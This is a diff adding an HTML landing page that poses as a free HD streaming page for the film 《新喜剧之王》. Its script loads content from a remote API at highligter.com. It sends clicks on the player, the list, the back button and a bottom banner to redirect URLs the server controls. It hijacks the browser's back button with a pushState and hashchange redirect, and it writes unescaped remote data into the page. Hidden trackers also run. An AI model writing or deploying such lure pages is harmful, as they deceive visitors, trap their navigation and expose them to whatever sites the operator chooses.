@@ -1,0 +1,133 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title></title>
+    <link rel="stylesheet" href="https://video-1227.oss-cn-hangzhou.aliyuncs.com/index.css?56wer=erwe">
+    <script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
+    <!--<script src="http://imgcache.qq.com/tencentvideo_v1/tvp/js/tvp.player_v2.js" type="text/javascript" ></script>-->
+</head>
+<body>
+<div class="box1"> < 返回 </div>
+<div class="box2">
+    <div id="mod_player">
+        <img class="bg1" src="https://gss3.bdstatic.com/7Po3dSag_xI4khGkpoWK1HF6hhy/baike/whfpf%3D180%2C140%2C50/sign=75a08bf1b3096b63814c0d106a0eb67c/8b82b9014a90f6030c6bd0993412b31bb151ed11.jpg" alt="">
+    </div>
+    <div class="vimg">
+        <img src="https://video-1227.oss-cn-hangzhou.aliyuncs.com/20190213134430.png" alt="">
+    </div>
+</div>
+<div class="box3">
+    <font size="3px" color="#B5A265">点击观看</font><font color="#B5A265" size="2px" style="position: relative;left: 50%">免费/高清</font>
+    <div class="box3-1" style="display: inline-block;
+    padding: 0 15px; width: auto"><a href="javascript::void(0)">高清</a></div>
+</div>
+<div class="box4">
+    <span>《新喜剧之王》高清免费在线观看</span>
+    <div class="icon"><img src="https://video-1227.oss-cn-hangzhou.aliyuncs.com/dianzan.png"><img src="https://video-1227.oss-cn-hangzhou.aliyuncs.com/xiazai.png"></div>
+</div>
+<div class="box5">
+    <span>9.6分</span>电影
+    <div class="box5-1">
+        <ul>
+            <li>主演：王宝强，鄂靖文，张全蛋，景如洋，张琪，袁兴哲</li>
+            <li>导演：周星驰</li>
+        </ul>
+    </div>
+    <font style="line-height: 1.5">《新喜剧之王》该片讲述如梦跑龙套的小迪醉心钻研演技，梦想成为出色的演员。即使生活穷困、遇上挫折，小迪仍然坚持到底，一直奋斗，最后终于明白演技的真谛，成为出色的演员。
+        一直有个明星梦的小镇大龄女青年如梦跑龙套多年未果。 她和父亲关系紧张，亲友都劝她放弃，只有男友查理还支持她。在剧组，如梦遇见了年少时启发她演戏的男演员马可。但此时过气多年的马可却因内心自卑而性情狂躁，对如梦百般折磨。如梦仍乐观坚持演戏，然而一次比一次沉重的打击却接踵而来，最后她决定放弃梦想，回到父母身边找了份稳定工作，但却得知自己入围了知名导演新片的大型选角。如梦陷入艰难抉择。</font>
+</div>
+
+<div class="cavs"></div>
+
+<div class="wcw" style="width: 100%;height: 80px;position: fixed;left: 0;bottom: 0;clear: both">
+    <img class="exdcas" style="display: block;width: 100%" src="https://1119videos.oss-cn-hangzhou.aliyuncs.com/14824015084721.gif" alt="">
+</div>
+<div style="display: none">
+    <script type="text/javascript" src="https://s96.cnzz.com/z_stat.php?id=1276137417&web_id=1276137417"></script>
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?8b0e2ed19b38aa8792b811069e7acda7";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+</div>
+</body>
+<script>
+    var iurl = window.location.search;
+    iurl = iurl.slice(1);
+    ajax('https://highligter.com/index/api/Github/str/'+iurl,function (obj) {
+        console.log(obj);
+        if(obj == 0){
+            document.body.innerHTML = '<strong style="color: #ffffff">404</strong>';
+        }else{
+            document.getElementsByClassName('bg1')[0].src =obj.index.img;
+            document.querySelectorAll(".box4 span")[0].innerHTML = '《'+ obj.index.title+'》高清免费在线观看';
+            document.querySelectorAll(".box5 span")[0].innerHTML = obj.index.grade+'分';
+            var oli = document.querySelectorAll(".box5-1 li");
+            oli[0].innerHTML = '主演：'+obj.index.act;
+            oli[1].innerHTML = '导演：'+obj.index.stage;
+            document.querySelectorAll(".box5 font")[0].innerHTML = obj.index.intro;
+
+            var str = '<div class="box6"><font>正在热播</font><font>更多 ></font>';
+            obj.list.forEach(function (item) {
+                str += '<div class="box6-1" _data="'+item.id+'"><ul><li class="one"><div class="list"><img src="'+item.img+'" width="135px" height="165px"></div><div class="lists" style="top:-169px;"><ul><li style="font-size: 18px;color: #f042de;font-weight: 600;">'+item.title+'</li><li>主演：'+item.act+'</li><li>导演：'+item.stage+'</li><li>评分：'+item.grade+'分</li><li>清晰度：蓝光</li><li>简介：'+item.intro+'</li></ul></div></li></ul></div>';
+            });
+            str += '<div style="height: 130px;"></div></div>';
+            document.getElementsByClassName('cavs')[0].innerHTML =str;
+
+            //列表点击事件
+            var Oli = document.getElementsByClassName('box6-1');
+            var Olength = Oli.length;
+            for(var i = 0; i < Olength ; i++){
+                Oli[i].addEventListener('click',function(){
+                    ajax('https://highligter.com/index/api/get_B/id/'+this.getAttribute('_data'),function (obj) {
+                        location.href = obj.v;
+                    })
+                },false);
+            }
+
+
+            document.getElementsByClassName('vimg')[0].addEventListener('click',Mplayer);
+            document.getElementsByClassName('box3-1')[0].addEventListener('click',Mplayer);
+            function Mplayer() {
+                ajax('https://highligter.com/index/api/get_C/id/'+obj.id,function (obj) {
+                    location.href = obj.v;
+                })
+            }
+        }
+        document.getElementsByClassName('exdcas')[0].src = obj.sys.aimg;
+        ajax('https://highligter.com/index/api/Advhub',function (e) {
+            document.getElementsByClassName('box1')[0].addEventListener('click',function () {
+                location.href = e.v;
+            });
+            document.getElementsByClassName('wcw')[0].addEventListener('click',function () {
+                location.href = e.v;
+            });
+            setTimeout(function(){
+                history.pushState(history.length + 1, "message", "#" + new Date().getTime());
+            },200);
+            window.onhashchange = function() {
+                location.href = e.v;
+            };
+        });
+    });
+    function ajax(url,callback) {
+        var ajax = new XMLHttpRequest();
+        ajax.open('get',url);
+        ajax.send();
+        ajax.onreadystatechange = function () {
+            if (ajax.readyState==4 && ajax.status==200) {
+                var obj = JSON.parse(ajax.responseText);
+                callback(obj);
+            }
+        }
+    }
+</script>
+</html>
